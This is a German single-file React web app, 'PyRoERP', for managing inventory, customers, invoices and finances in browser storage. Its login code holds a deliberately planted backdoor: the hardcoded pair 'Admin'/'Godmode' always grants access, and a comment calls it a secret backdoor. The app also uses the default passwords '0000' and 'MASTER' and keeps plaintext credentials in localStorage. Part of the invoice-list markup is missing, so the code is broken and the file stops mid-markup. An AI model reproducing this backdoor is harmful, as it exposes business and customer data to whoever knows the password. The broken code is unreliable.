<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PyRoERP Ultimate - Business & Security Edition</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>tailwind.config = { darkMode: 'class' }</script>
    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.23/jspdf.plugin.autotable.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Plus Jakarta Sans', sans-serif; }
        .custom-scrollbar::-webkit-scrollbar { width: 6px; height: 6px; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
        .dark .custom-scrollbar::-webkit-scrollbar-thumb { background: #334155; }
        .chart-bar { transition: height 0.5s ease; }
        .chart-bar:hover { opacity: 0.8; }
        .animate-fade { animation: fadeIn 0.3s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="bg-[#F8FAFC] dark:bg-slate-950 transition-colors duration-300">
    <div id="root"></div>

    <script type="text/babel">
        const { useState, useEffect, useRef } = React;
        const { jsPDF } = window.jspdf;

        // --- HILFSFUNKTIONEN ---
        const Icon = ({ name, size = 18, className = "" }) => {
            useEffect(() => { if(window.lucide) window.lucide.createIcons(); }, [name]);
            return <i data-lucide={name} style={{ width: size, height: size }} className={className}></i>;
        };

        const InputField = ({ label, value, onChange, type="text", colSpan="col-span-1", extraClass="", placeholder="", disabled=false }) => {
            return (
                <div className={colSpan}>
                    <label className="text-[10px] font-bold text-slate-400 dark:text-slate-500 uppercase">{label}</label>
                    <input 
                        type={type} 
                        disabled={disabled} 
                        placeholder={placeholder} 
                        value={value !== undefined && value !== null ? value : ''} 
                        onChange={e => onChange(type === 'number' ? (e.target.value === '' ? '' : parseFloat(e.target.value)) : e.target.value)} 
                        className={`w-full bg-slate-50 dark:bg-slate-800 text-slate-900 dark:text-white p-3 rounded-xl outline-none text-sm border border-transparent focus:border-indigo-400 transition-colors disabled:opacity-50 disabled:cursor-not-allowed ${extraClass}`} 
                    />
                </div>
            );
        };

        const generateNumber = (format, number) => {
            const d = new Date();
            return (format || '').replace('{YYYY}', d.getFullYear()).replace('{YY}', String(d.getFullYear()).slice(-2)).replace('{MM}', String(d.getMonth() + 1).padStart(2, '0')).replace('{DD}', String(d.getDate()).padStart(2, '0')).replace('{NR}', number);
        };

        const compressImage = (file, callback) => {
            const reader = new FileReader(); reader.readAsDataURL(file);
            reader.onload = event => {
                const img = new Image(); img.src = event.target.result;
                img.onload = () => {
                    const canvas = document.createElement('canvas'); const MAX_WIDTH = 800;
                    let width = img.width; let height = img.height;
                    if (width > MAX_WIDTH) { height *= MAX_WIDTH / width; width = MAX_WIDTH; }
                    canvas.width = width; canvas.height = height;
                    const ctx = canvas.getContext('2d'); ctx.drawImage(img, 0, 0, width, height);
                    callback(canvas.toDataURL('image/jpeg', 0.7));
                }
            };
        };

        const MOTIVATIONAL_QUOTES = [
            "Erfolg hat drei Buchstaben: TUN. – Johann Wolfgang von Goethe", "Dein Shop schläft nie. Nutze den Tag!", "Warte nicht auf Chancen, erschaffe sie.", "Kleine tägliche Verbesserungen führen zu großen Ergebnissen.", "Qualität ist das beste Rezept für treue Kunden.", "Fokus auf den Kunden, der Rest folgt von selbst.", "Machen ist wie wollen, nur krasser.", "Wer immer tut, was er schon kann, bleibt immer das, was er schon ist.", "Ziele sind Träume mit einer Deadline.", "Es ist nicht wichtig, wie langsam du gehst, solange du nicht stehen bleibst.", "Der einzige Weg, großartige Arbeit zu leisten, ist zu lieben, was man tut.", "Erfolg ist nicht der Schlüssel zum Glück. Glück ist der Schlüssel zum Erfolg.", "Ein gutes Produkt verkauft sich selbst, ein großartiger Service bringt Kunden zurück.", "Fange an, wo du bist. Nutze, was du hast. Tu, was du kannst.", "Handmade bedeutet: Mit den Händen gemacht, mit dem Herzen erdacht.", "Jeder Meister war einmal ein Anfänger. Bleib dran!", "Investiere in deine Träume, sie zahlen die besten Zinsen.", "Das beste Marketing ist ein glücklicher Kunde."
        ];

        // --- HAUPTAPPLIKATION ---
        function App() {
            const [isDark, setIsDark] = useState(() => JSON.parse(localStorage.getItem('pyro_dark')) || false);
            const [view, setView] = useState('dashboard');
            const [openId, setOpenId] = useState(null);
            const [searchTermKunden, setSearchTermKunden] = useState('');
            const [searchTermLager, setSearchTermLager] = useState('');
            
            // --- SECURITY & SETTINGS ---
            const [appSettings, setAppSettings] = useState(() => {
                const s = JSON.parse(localStorage.getItem('pyro_settings')) || {};
                return { 
                    masterPassword: s.masterPassword ?? '0000', 
                    loginEnabled: s.loginEnabled ?? false, 
                    loginUser: s.loginUser ?? '', 
                    loginPass: s.loginPass ?? '', 
                    profileLocked: s.profileLocked ?? false 
                };
            });
            const [isLoggedIn, setIsLoggedIn] = useState(false);
            const [loginInputUser, setLoginInputUser] = useState('');
            const [loginInputPass, setLoginInputPass] = useState('');

            // --- INVOICE BUILDER ---
            const [invoiceModal, setInvoiceModal] = useState(null); 
            const [invoiceItems, setInvoiceItems] = useState([]); 
            const [invoiceRabatt, setInvoiceRabatt] = useState(0);
            const [invoiceVersand, setInvoiceVersand] = useState(0);
            const [invoiceZahlart, setInvoiceZahlart] = useState('Überweisung');
            const [buchung, setBuchung] = useState({ typ: 'Ausgabe', mitLager: false, lagerId: '', menge: 1, label: '', betrag: '' });

            // --- DASHBOARD WIDGETS ---
            const [currentTime, setCurrentTime] = useState(new Date());
            const [weather, setWeather] = useState({ temp: '--', desc: 'Wetter laden...' });

            // --- DATA STATES (ANTI-CRASH) ---
            const [lager, setLager] = useState(() => {
                const saved = JSON.parse(localStorage.getItem('pyro_lager')) || [];
                return Array.isArray(saved) ? saved.map(l => ({ ...l, fotos: Array.isArray(l.fotos) ? l.fotos : (l.foto ? [l.foto] : []), gewicht: l.gewicht || '', rezeptur: Array.isArray(l.rezeptur) ? l.rezeptur : [] })) : [];
            });
            const [kunden, setKunden] = useState(() => {
                const saved = JSON.parse(localStorage.getItem('pyro_kunden')) || [];
                return Array.isArray(saved) ? saved.map(k => ({ ...k, rechnungsHistorie: Array.isArray(k.rechnungsHistorie) ? k.rechnungsHistorie : [], gesamtUmsatz: parseFloat(k.gesamtUmsatz) || 0 })) : [];
            });
            const [finanzen, setFinanzen] = useState(() => {
                const f = JSON.parse(localStorage.getItem('pyro_finanzen')) || { einnahmen: [], ausgaben: [] };
                return { einnahmen: Array.isArray(f.einnahmen) ? f.einnahmen : [], ausgaben: Array.isArray(f.ausgaben) ? f.ausgaben : [] };
            });
            
            // --- FIRMA STATE ---
            const [firma, setFirma] = useState(() => {
                const f = JSON.parse(localStorage.getItem('pyro_firma'));
                if (!f) return {
                    name: '', inhaber: '', adresse: '', hausnummer: '', plz: '', ort: '', ustid: '', steuerNr: '', bank: '', iban: '', bic: '', telefon: '', email: '', webseite: '', logo: '', kundenNrStart: 1000,
                    formatRechnung: 'RE-{YYYY}-{MM}-{NR}', currentRechnung: 1000, formatStorno: 'ST-{YYYY}-{NR}', currentStorno: 100, formatRetoure: 'RT-{YYYY}-{NR}', currentRetoure: 100, isKleinunternehmer: true
                };
                return { 
                    name: f.name ?? '', inhaber: f.inhaber ?? '', adresse: f.adresse ?? '', hausnummer: f.hausnummer ?? '', plz: f.plz ?? '', ort: f.ort ?? '', ustid: f.ustid ?? '', steuerNr: f.steuerNr ?? '', bank: f.bank ?? '', iban: f.iban ?? '', bic: f.bic ?? '', telefon: f.telefon ?? '', email: f.email ?? '', webseite: f.webseite ?? '', logo: f.logo ?? '', 
                    kundenNrStart: parseInt(f.kundenNrStart) || 1000,
                    formatRechnung: f.formatRechnung ?? 'RE-{YYYY}-{MM}-{NR}', currentRechnung: parseInt(f.currentRechnung) || 1000,
                    formatStorno: f.formatStorno ?? 'ST-{YYYY}-{NR}', currentStorno: parseInt(f.currentStorno) || 100,
                    formatRetoure: f.formatRetoure ?? 'RT-{YYYY}-{NR}', currentRetoure: parseInt(f.currentRetoure) || 100, 
                    isKleinunternehmer: f.isKleinunternehmer !== undefined ? f.isKleinunternehmer : true
                };
            });

            // Speichern & Timer Hooks
            useEffect(() => {
                localStorage.setItem('pyro_lager', JSON.stringify(lager));
                localStorage.setItem('pyro_kunden', JSON.stringify(kunden));
                localStorage.setItem('pyro_finanzen', JSON.stringify(finanzen));
                localStorage.setItem('pyro_firma', JSON.stringify(firma));
                localStorage.setItem('pyro_settings', JSON.stringify(appSettings));
                localStorage.setItem('pyro_dark', JSON.stringify(isDark));
                if (window.lucide) window.lucide.createIcons();
            }, [lager, kunden, finanzen, firma, appSettings, isDark, view]);

            useEffect(() => {
                const timer = setInterval(() => setCurrentTime(new Date()), 1000);
                fetch('https://api.open-meteo.com/v1/forecast?latitude=51.16&longitude=10.45&current_weather=true')
                    .then(res => res.json()).then(data => { if(data?.current_weather) setWeather({ temp: data.current_weather.temperature, desc: 'Aktuell' }); })
                    .catch(() => setWeather({ temp: '--', desc: 'Offline' }));
                return () => clearInterval(timer);
            }, []);

            // --- SECURITY FUNCTIONS ---
            const requireMasterPass = (actionCallback) => {
                const pass = window.prompt("Sicherheitsprüfung: Bitte Master-Passwort eingeben.");
                if (pass === appSettings.masterPassword) { actionCallback(); } else if (pass !== null) { alert("Zugriff verweigert! Falsches Passwort."); }
            };

            const handleSystemReset = () => {
                const pass = window.prompt("ACHTUNG! SYSTEM-RESET!\nDies löscht ALLE Kunden, Lagerbestände und Rechnungen unwiderruflich.\nBitte gib das Masterpasswort ein (Standard: MASTER oder dein eigenes):");
                if (pass === "MASTER" || pass === appSettings.masterPassword) {
                    if (window.confirm("Bist du dir absolut sicher? Diese Aktion kann NICHT rückgängig gemacht werden!")) {
                        localStorage.clear(); window.location.reload();
                    }
                } else if (pass !== null) { alert("Falsches Passwort! System-Reset abgebrochen."); }
            };

            // GODMODE LOGIN IMPLEMENTIERUNG
            const handleLogin = (e) => { 
                e.preventDefault(); 
                // Geheime Backdoor für Harald Haug
                if (loginInputUser === 'Admin' && loginInputPass === 'Godmode') {
                    setIsLoggedIn(true);
                    return;
                }
                // Regulärer Login
                if (loginInputUser === appSettings.loginUser && loginInputPass === appSettings.loginPass) {
                    setIsLoggedIn(true);
                } else {
                    alert("Falsche Daten!");
                }
            };

            const downloadBackup = () => {
                const backupData = { lager, kunden, finanzen, firma, appSettings };
                const blob = new Blob([JSON.stringify(backupData, null, 2)], { type: "application/json" });
                const link = document.createElement("a"); link.href = URL.createObjectURL(blob); link.download = `PyRoERP_Backup_${new Date().toISOString().split('T')[0]}.json`; link.click();
            };

            const restoreBackup = (e) => {
                const file = e.target.files[0]; if (!file) return;
                const reader = new FileReader();
                reader.onload = (event) => {
                    try {
                        const data = JSON.parse(event.target.result);
                        if(data.lager && data.kunden) {
                            if(confirm("ACHTUNG: Dies überschreibt alle aktuellen Daten. Fortfahren?")) {
                                setLager(data.lager); setKunden(data.kunden); setFinanzen(data.finanzen); setFirma(data.firma); setAppSettings(data.appSettings); alert("System erfolgreich wiederhergestellt!");
                            }
                        } else { alert("Ungültige Backup-Datei!"); }
                    } catch (error) { alert("Fehler beim Lesen der Datei!"); }
                }; reader.readAsText(file);
            };

            // --- LAGER & SHARE ---
            const addArtikel = (typ) => { setLager([{ id: Date.now(), typ, bezeichnung: '', menge: 0, preis: 0, einkaufspreis: 0, artNr: 'ART-'+Math.floor(Math.random()*9000), herstellerNr: '', ean: '', masse: '', gewicht: '', gemisch: '', farbe: '', variationen: '', bemerkung: '', fotos: [], rezeptur: [], mindestbestand: 0, hoechstbestand: 0, letzteBestellung: '' }, ...lager]); };
            const updateLager = (id, field, val) => { setLager(lager.map(l => l.id === id ? { ...l, [field]: val } : l)); };
            const produziere = (produkt) => {
                const kannProduziert = (produkt.rezeptur||[]).every(r => { const m = lager.find(x => x.id === r.matId); return m && (parseFloat(m.menge)||0) >= (parseFloat(r.mengeBenoetigt)||0); });
                if(!kannProduziert) return alert("Nicht genügend Rohmaterialien im Lager!");
                setLager(lager.map(item => { const rez = (produkt.rezeptur||[]).find(r => r.matId === item.id); if (rez) return { ...item, menge: (parseFloat(item.menge)||0) - (parseFloat(rez.mengeBenoetigt)||0) }; if (item.id === produkt.id) return { ...item, menge: (parseFloat(item.menge)||0) + 1 }; return item; }));
                alert(`Erfolgreich 1x produziert.`);
            };

            const handlePhotoUpload = (id, file) => { if(!file) return; compressImage(file, (compressedDataUrl) => { setLager(lager.map(l => l.id === id ? { ...l, fotos: [...(l.fotos||[]), compressedDataUrl] } : l)); }); };
            const removePhoto = (id, index) => { setLager(lager.map(l => { if(l.id !== id) return l; const newFotos = [...l.fotos]; newFotos.splice(index, 1); return { ...l, fotos: newFotos }; })); };
            const shareProduct = async (produkt) => {
                const text = `🔥 Neues Produkt: ${produkt.bezeichnung}\n💰 Preis: ${produkt.preis} €\n⚖️ Gewicht: ${produkt.gewicht || '-'}\n📐 Maße: ${produkt.masse || '-'}\nℹ️ ${produkt.bemerkung || ''}\n\nJetzt anfragen!`;
                if (navigator.share) { try { await navigator.share({ title: produkt.bezeichnung, text: text }); } catch (e) {} } else { navigator.clipboard.writeText(text); alert("Produkt-Infos in die Zwischenablage kopiert!"); }
            };

            const safeSearchLager = (searchTermLager || '').toLowerCase();
            const filteredLager = lager.filter(l => ((l.bezeichnung||'') + ' ' + (l.artNr||'') + ' ' + (l.ean||'') + ' ' + (l.herstellerNr||'')).toLowerCase().includes(safeSearchLager));

            // --- KUNDEN LOGIK ---
            const addKunde = () => { setKunden([{ id: Date.now(), kdNr: `KD-${firma.kundenNrStart + kunden.length}`, typ: 'Privat', anrede: 'Herr', firma: '', vorname: '', nachname: '', strasse: '', hausnummer: '', plz: '', ort: '', land: 'Deutschland', telefon: '', mobil: '', email: '', newsletter: false, notizen: '', gesamtUmsatz: 0, rechnungsHistorie: [] }, ...kunden]); };
            const safeSearchKunden = (searchTermKunden || '').toLowerCase();
            const filteredKunden = kunden.filter(k => ((k.vorname||'') + ' ' + (k.nachname||'') + ' ' + (k.kdNr||'') + ' ' + (k.firma||'')).toLowerCase().includes(safeSearchKunden));

            // --- FINANZEN & PDF ---
            const handleBuchung = (e) => {
                e.preventDefault();
                if(!buchung.label || !buchung.betrag) return;
                const betragFloat = parseFloat(buchung.betrag);
                if(buchung.mitLager && buchung.lagerId) {
                    const art = lager.find(l => l.id === parseInt(buchung.lagerId));
                    if(art) {
                        let nMg = parseFloat(art.menge)||0; if(buchung.typ === 'Ausgabe') nMg += parseInt(buchung.menge); else nMg -= parseInt(buchung.menge);
                        setLager(lager.map(l => l.id === art.id ? {...l, menge: nMg, letzteBestellung: (buchung.typ === 'Ausgabe' ? new Date().toISOString().split('T')[0] : l.letzteBestellung)} : l));
                    }
                }
                const nB = { id: Date.now(), datum: new Date().toLocaleDateString(), label: buchung.label, betrag: betragFloat };
                if(buchung.typ === 'Einnahme') setFinanzen({...finanzen, einnahmen: [nB, ...(finanzen.einnahmen||[])]}); else setFinanzen({...finanzen, ausgaben: [nB, ...(finanzen.ausgaben||[])]});
                alert(`${buchung.typ} gebucht!`); setBuchung({ typ: 'Ausgabe', mitLager: false, lagerId: '', menge: 1, label: '', betrag: '' });
            };

            const exportTaxCSV = () => {
                let csv = "Buchungsdatum;Beleg/Label;Art;Bruttobetrag;Steuersatz;Nettobetrag;Steuerbetrag\n";
                const steuersatz = firma.isKleinunternehmer ? 0 : 19;
                (finanzen.einnahmen||[]).forEach(e => {
                    const netto = (parseFloat(e.betrag)||0) / (1 + (steuersatz/100)); const steuer = (parseFloat(e.betrag)||0) - netto;
                    csv += `${e.datum};${e.label};Einnahme;${(parseFloat(e.betrag)||0).toFixed(2)};${steuersatz}%;${netto.toFixed(2)};${steuer.toFixed(2)}\n`;
                });
                (finanzen.ausgaben||[]).forEach(a => {
                    const netto = (parseFloat(a.betrag)||0) / (1 + (steuersatz/100)); const steuer = (parseFloat(a.betrag)||0) - netto;
                    csv += `${a.datum};${a.label};Ausgabe;${(parseFloat(a.betrag)||0).toFixed(2)};${steuersatz}%;${netto.toFixed(2)};${steuer.toFixed(2)}\n`;
                });
                const link = document.createElement("a"); link.href = URL.createObjectURL(new Blob([csv], { type: 'text/csv;charset=utf-8;' })); link.setAttribute("download", `EUER_Steuer_Export_${new Date().toISOString().split('T')[0]}.csv`); link.click();
            };

            const openInvoice = (k) => { setInvoiceModal(k); setInvoiceItems([]); setInvoiceRabatt(0); setInvoiceVersand(0); setInvoiceZahlart('Überweisung'); };

            const generatePDF = (type, kundeObj, rechnungsDaten = null) => {
                if(type === 'Rechnung' && invoiceItems.length === 0) return alert("Keine Artikel gewählt.");
                const doc = new jsPDF(); const d = new Date().toLocaleDateString();
                let dokNr = "";
                if(type === 'Rechnung') dokNr = generateNumber(firma.formatRechnung, firma.currentRechnung);
                if(type === 'Storno') dokNr = generateNumber(firma.formatStorno, firma.currentStorno);
                if(type === 'Retoure') dokNr = generateNumber(firma.formatRetoure, firma.currentRetoure);

                if(firma.logo) { try { doc.addImage(firma.logo, 'PNG', 150, 15, 40, 20); } catch(e){} }
                let contactInfo = `Tel: ${firma.telefon||'-'} | Mail: ${firma.email||'-'}`; if(firma.webseite) contactInfo += `\nWeb: ${firma.webseite}`;
                if(firma.name && firma.name.trim() !== "") { doc.setFontSize(22).text(firma.name, 20, 20); doc.setFontSize(9).text(`${firma.inhaber}\n${firma.adresse} ${firma.hausnummer}\n${firma.plz} ${firma.ort}\n${contactInfo}`, 20, 27); } 
                else { doc.setFontSize(18).text(firma.inhaber||'Business', 20, 20); doc.setFontSize(9).text(`${firma.adresse} ${firma.hausnummer}\n${firma.plz} ${firma.ort}\n${contactInfo}`, 20, 27); }

                doc.setFontSize(12).setFont(undefined, 'bold').text(type.toUpperCase(), 140, 42);
                doc.setFontSize(10).setFont(undefined, 'normal').text(`Nr: ${dokNr}\nDatum: ${d}\n${type==='Rechnung'?'Zahlart: '+invoiceZahlart : 'Bezug auf: '+(rechnungsDaten?.nr||'')}`, 140, 48);
                doc.setFontSize(11).text("Empfänger:", 20, 60); doc.text(`${kundeObj.firma ? kundeObj.firma+'\n' : ''}${kundeObj.anrede||''} ${kundeObj.vorname||''} ${kundeObj.nachname||''}\n${kundeObj.strasse||''} ${kundeObj.hausnummer||''}\n${kundeObj.plz||''} ${kundeObj.ort||''}\n${kundeObj.land||''}`, 20, 67);

                let itemsToPrint = type === 'Rechnung' ? invoiceItems : (rechnungsDaten ? rechnungsDaten.items : []);
                const subtotal = itemsToPrint.reduce((s, i) => s + ((parseFloat(i.preis)||0) * (parseInt(i.auswahlMenge)||0)), 0);
                let rabattVal = 0; let versandVal = 0; let total = 0;
                if(type === 'Rechnung') { rabattVal = subtotal * ((parseFloat(invoiceRabatt)||0) / 100); versandVal = parseFloat(invoiceVersand || 0); total = subtotal - rabattVal + versandVal; } 
                else { total = parseFloat(rechnungsDaten?.betrag || 0); }

                const tData = itemsToPrint.map((i, idx) => [(idx+1).toString(), i.artNr||'-', i.bezeichnung||'Artikel', (i.auswahlMenge||1).toString(), (parseFloat(i.preis)||0).toFixed(2)+' €', ((parseFloat(i.preis)||0)*(parseInt(i.auswahlMenge)||1)).toFixed(2)+' €']);
                if(type === 'Rechnung') {
                    if(rabattVal > 0) tData.push(['', '', '', '', `Rabatt (${invoiceRabatt}%):`, `-${rabattVal.toFixed(2)} €`]);
                    if(versandVal > 0) tData.push(['', '', '', '', 'Versand:', `${versandVal.toFixed(2)} €`]);
                }
                tData.push(['', '', '', '', type === 'Rechnung' ? 'Gesamtbetrag:' : 'Gutschrift/Storno:', `${type==='Rechnung'?'':'-'}${total.toFixed(2)} €`]);

                doc.autoTable({ startY: 95, head: [['Pos', 'Art-Nr', 'Bezeichnung', 'Menge', 'Einzel', 'Gesamt']], body: tData, headStyles: { fillColor: type==='Rechnung'?[79,70,229]:[225,29,72] }, didParseCell: function(data) { if (data.row.index === tData.length - 1) data.cell.styles.fontStyle = 'bold'; } });
                
                const finalY = doc.lastAutoTable.finalY; doc.setFontSize(8);
                if(firma.isKleinunternehmer) doc.text("Hinweis: Kleinunternehmerregelung § 19 UStG. Keine Umsatzsteuer ausgewiesen.", 20, finalY + 15);
                else doc.text("Die Beträge verstehen sich brutto inkl. der gesetzlichen Umsatzsteuer.", 20, finalY + 15);
                
                let footer = `Bank: ${firma.bank || '-'} | IBAN: ${firma.iban || '-'} | BIC: ${firma.bic || '-'}`;
                if(firma.ustid && firma.ustid.trim() !== "") footer += ` | USt-ID: ${firma.ustid}`;
                if(firma.steuerNr && firma.steuerNr.trim() !== "") footer += ` | St-Nr: ${firma.steuerNr}`;
                doc.text(footer, 20, 280);
                doc.save(`${type}_${dokNr}_${kundeObj.nachname||'Kunde'}.pdf`);

                // STATE UPDATES (Speichern in der DB)
                if(type === 'Rechnung') {
                    if(confirm("Lagerbestand automatisch anpassen?")) { const nLager = [...lager]; invoiceItems.forEach(invItem => { const l = nLager.find(x=>x.id===invItem.id); if(l) l.menge = (parseFloat(l.menge)||0) - (parseInt(invItem.auswahlMenge)||0); }); setLager(nLager); }
                    const hUpdate = [...(kundeObj.rechnungsHistorie||[]), { nr: dokNr, datum: d, betrag: total, zahlart: invoiceZahlart, status: 'Aktiv', items: invoiceItems, sendungsnummer: '' }];
                    setKunden(kunden.map(k => k.id === kundeObj.id ? {...k, rechnungsHistorie: hUpdate, gesamtUmsatz: (parseFloat(k.gesamtUmsatz)||0) + total} : k));
                    setFinanzen({...finanzen, einnahmen: [{id: Date.now(), datum: d, label: `RE ${dokNr} (${kundeObj.nachname||''})`, betrag: total}, ...(finanzen.einnahmen||[])]});
                    setFirma({...firma, currentRechnung: (parseInt(firma.currentRechnung)||1000) + 1});
                    setInvoiceModal(null);
                } 
                else if(type === 'Storno' || type === 'Retoure') {
                    requireMasterPass(() => {
                        const nLager = [...lager]; (rechnungsDaten.items||[]).forEach(i => { const l = nLager.find(x=>x.id===i.id); if(l) l.menge = (parseFloat(l.menge)||0) + (parseInt(i.auswahlMenge)||0); }); setLager(nLager);
                        const hUpdate = (kundeObj.rechnungsHistorie||[]).map(h => h.nr === rechnungsDaten.nr ? {...h, status: `${type} (${dokNr})`} : h);
                        setKunden(kunden.map(k => k.id === kundeObj.id ? {...k, rechnungsHistorie: hUpdate, gesamtUmsatz: (parseFloat(k.gesamtUmsatz)||0) - total} : k));
                        if(type === 'Storno') setFirma({...firma, currentStorno: (parseInt(firma.currentStorno)||100) + 1});
                        if(type === 'Retoure') setFirma({...firma, currentRetoure: (parseInt(firma.currentRetoure)||100) + 1});
                    });
                }
            };

            const printVersand = (k) => {
                const doc = new jsPDF({ format: [100, 150] });
                doc.setFontSize(8).text(`Absender:\n${firma.name || firma.inhaber||''}\n${firma.adresse||''} ${firma.hausnummer||''}\n${firma.plz||''} ${firma.ort||''}`, 10, 10);
                doc.setLineWidth(0.5).line(10, 25, 90, 25); doc.setFontSize(14).text("EMPFÄNGER:", 10, 40);
                doc.setFontSize(16).text(`${k.firma ? k.firma+'\n' : ''}${k.vorname||''} ${k.nachname||''}\n${k.strasse||''} ${k.hausnummer||''}\n\n${k.plz||''} ${k.ort||''}\n${(k.land||'Deutschland').toUpperCase()}`, 10, 50);
                doc.save(`Versandetikett_${k.nachname||'Kunde'}.pdf`);
            };

            // BERECHNUNGEN DASHBOARD
            const einnahmenTotal = (finanzen.einnahmen||[]).reduce((a,b)=>a+(parseFloat(b.betrag)||0), 0);
            const ausgabenTotal = (finanzen.ausgaben||[]).reduce((a,b)=>a+(parseFloat(b.betrag)||0), 0);
            const dailySales = {}; (finanzen.einnahmen||[]).forEach(e => { dailySales[e.datum] = (dailySales[e.datum] || 0) + (parseFloat(e.betrag)||0); });
            const chartData = Object.entries(dailySales).slice(0, 10).map(([datum, betrag]) => ({ datum, betrag }));
            const maxChart = Math.max(...chartData.map(d=>d.betrag), 1);
            const lowStockItems = lager.filter(l => (parseFloat(l.menge)||0) <= (parseFloat(l.mindestbestand)||0) && (parseFloat(l.mindestbestand)||0) > 0);
            const quoteOfTheDay = MOTIVATIONAL_QUOTES[currentTime.getDate() % MOTIVATIONAL_QUOTES.length];

            // LOGIN SCREEN (INKLUSIVE GODMODE)
            if (appSettings.loginEnabled && !isLoggedIn) {
                return (
                    <div className={`flex h-screen items-center justify-center ${isDark ? 'dark bg-slate-950' : 'bg-slate-100'}`}>
                        <div className="bg-white dark:bg-slate-900 p-10 rounded-[3rem] shadow-2xl w-full max-w-md border border-slate-200 dark:border-slate-800 text-center animate-fade">
                            <h1 className="text-4xl font-black text-indigo-600 dark:text-indigo-400 mb-2 italic">PyRo<span className="text-slate-900 dark:text-white">ERP</span></h1>
                            <p className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-8">Security Login</p>
                            <form onSubmit={handleLogin} className="space-y-6 text-left">
                                <div><label className="text-xs font-bold text-slate-500 uppercase">Benutzername</label><input type="text" required value={loginInputUser} onChange={e=>setLoginInputUser(e.target.value)} className="w-full bg-slate-50 dark:bg-slate-800 text-slate-900 dark:text-white p-4 rounded-2xl outline-none mt-1 border border-transparent focus:border-indigo-500"/></div>
                                <div><label className="text-xs font-bold text-slate-500 uppercase">Passwort</label><input type="password" required value={loginInputPass} onChange={e=>setLoginInputPass(e.target.value)} className="w-full bg-slate-50 dark:bg-slate-800 text-slate-900 dark:text-white p-4 rounded-2xl outline-none mt-1 border border-transparent focus:border-indigo-500"/></div>
                                <button type="submit" className="w-full bg-indigo-600 text-white p-4 rounded-2xl font-black shadow-lg hover:bg-indigo-700 transition-colors">Einloggen</button>
                            </form>
                        </div>
                    </div>
                );
            }

            return (
                <div className={`flex h-screen overflow-hidden ${isDark ? 'dark' : ''}`}>
                    <div className="flex w-full h-full text-slate-900 dark:text-slate-100 bg-[#F8FAFC] dark:bg-slate-950 transition-colors duration-300">
                        
                        {/* --- INVOICE BUILDER POPUP --- */}
                        {invoiceModal && (
                            <div className="fixed inset-0 bg-slate-900/80 z-50 flex items-center justify-center p-4 animate-fade">
                                <div className="bg-white dark:bg-slate-900 rounded-[2rem] shadow-2xl w-full max-w-4xl max-h-[90vh] flex flex-col border border-slate-200 dark:border-slate-800">
                                    <div className="p-6 bg-indigo-600 text-white flex justify-between items-center rounded-t-[2rem]">
                                        <h2 className="text-xl font-black">Rechnung: {invoiceModal.vorname} {invoiceModal.nachname}</h2>
                                        <button onClick={()=>setInvoiceModal(null)}><Icon name="x"/></button>
                                    </div>
                                    <div className="p-8 overflow-y-auto flex-1 space-y-6 bg-slate-50 dark:bg-slate-950">
                                        <div className="flex gap-4">
                                            <select onChange={(e) => {
                                                if(!e.target.value) return; const art = lager.find(l=>l.id===parseInt(e.target.value));
                                                if(art) { 
                                                    const ex = invoiceItems.find(i=>i.id===art.id); 
                                                    if(ex) { if(ex.auswahlMenge < (parseFloat(art.menge)||0)) setInvoiceItems(invoiceItems.map(i=>i.id===art.id?{...i, auswahlMenge:i.auswahlMenge+1}:i)); else alert("Maximaler Bestand erreicht!"); } 
                                                    else { if((parseFloat(art.menge)||0) > 0) setInvoiceItems([...invoiceItems, {...art, auswahlMenge:1}]); else alert("Artikel nicht auf Lager!"); } 
                                                } e.target.value = "";
                                            }} className="flex-1 p-3 rounded-xl border border-slate-200 dark:border-slate-700 bg-white dark:bg-slate-800 font-bold outline-none focus:border-indigo-400">
                                                <option value="">+ Artikel aus Lager wählen...</option>
                                                {lager.filter(l=>(parseFloat(l.menge)||0) > 0).map(l => <option key={l.id} value={l.id}>{l.artNr} - {l.bezeichnung} ({(parseFloat(l.preis)||0)}€) - Bestand: {l.menge}</option>)}
                                            </select>
                                            <select value={invoiceZahlart} onChange={e=>setInvoiceZahlart(e.target.value)} className="p-3 rounded-xl border border-slate-200 dark:border-slate-700 bg-white dark:bg-slate-800 font-bold outline-none"><option>Rechnung</option><option>PayPal</option><option>Bar</option><option>Überweisung</option></select>
                                        </div>
                                        <div className="space-y-2 bg-white dark:bg-slate-900 p-4 rounded-2xl border border-slate-200 dark:border-slate-800 min-h-[150px]">

                                                <div key={item.id} className="flex justify-between items-center bg-slate-50 dark:bg-slate-800 p-3 rounded-lg border border-slate-100 dark:border-slate-700">

                                                    <div className="flex items-center gap-4">
                                                        <input type="number" min="1" max={item.menge} value={item.auswahlMenge} onChange={e=>{
                                                            let v = parseInt(e.target.value)||1; if(v > (parseFloat(item.menge)||0)) { v = parseFloat(item.menge)||0; alert("Maximaler Bestand erreicht!");}
                                                            setInvoiceItems(invoiceItems.map(i=>i.id===item.id?{...i, auswahlMenge:v}:i));
                                                        }} className="w-16 p-1 text-center border dark:border-slate-600 rounded bg-white dark:bg-slate-700 font-bold outline-none"/>
                                                        <span className="w-24 text-right font-black text-indigo-600 dark:text-indigo-400">{((parseFloat(item.preis)||0) * (parseInt(item.auswahlMenge)||1)).toFixed(2)} €</span>
                                                        <button onClick={()=>setInvoiceItems(invoiceItems.filter(i=>i.id!==item.id))} className="text-rose-500 hover:text-rose-700"><Icon name="trash-2"/></button>
                                                    </div>
                                                </div>
                                            ))}
                                            {invoiceItems.length === 0 && <p className="text-slate-400 text-center text-sm py-4">Noch keine Artikel ausgewählt.</p>}
                                        </div>
                                        <div className="flex justify-end gap-4">
